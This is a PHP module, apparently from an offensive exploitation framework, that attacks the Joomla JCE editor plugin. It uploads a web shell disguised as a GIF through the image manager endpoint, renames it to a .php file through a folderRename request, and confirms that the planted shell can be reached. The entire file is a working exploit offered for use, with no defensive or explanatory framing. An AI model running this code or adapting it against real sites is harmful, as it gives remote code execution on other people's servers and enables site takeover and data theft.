<?php
class WebappJoomlaJCE extends Exploit {

	public function run($shellPath){
		$config = Registry::getConfig();
		//Creating shell.gif
		$giftShell = rand(100,99999).".gif";
		$filepath = $config->get("tmpPath").$giftShell;
		copy($shellPath, $filepath);
		//Shell upload
		$code = null;
		$url = "http://".$this->virtualhost->host."/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743";
		$post = array();
		$post["upload-dir"] = "/";
		$post["upload-overwrite"] = 0;
		$post["Filedata"] = "@".$filepath;
		$post["action"] = "upload";
		$res = curl($url, $post, $code);
		//Upload failed?
		if(!strstr($res, '{"result":{')){
			echoCli("Upload failed", "error");
			return false;
		}
		//Remove tmp file
		@unlink($filepath);
		//Shell rename
		$phpShell = str_replace("gif","php", $giftShell);
		echoCli("Renaming shell (".$phpShell.")", "info");
		$url = "http://".$this->virtualhost->host."/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20";
		$post = array();
		$post["json"] = "{\"fn\":\"folderRename\",\"args\":[\"/".$giftShell."\",\"".$phpShell."\"]}";
		$res = $this->curl($url, $post);
		//Rename failed?
		if(!strstr($res, '{"result":{"error":""}')){
			echoCli("Rename failed: ".$res, "error");
			return false;
		}else{
			echoCli("Shell renamed", "success");
		}
		$code = null;
		//Upload ok?
		$shellUrl = "http://".$this->virtualhost->host."/images/stories/".$phpShell;
		$res = $this->curl($shellUrl, null, $code);
		if($code!=200){
			echoCli("Error. Code: ".$code, "error");
			return 0;
		}
		return $shellUrl;
	}

}
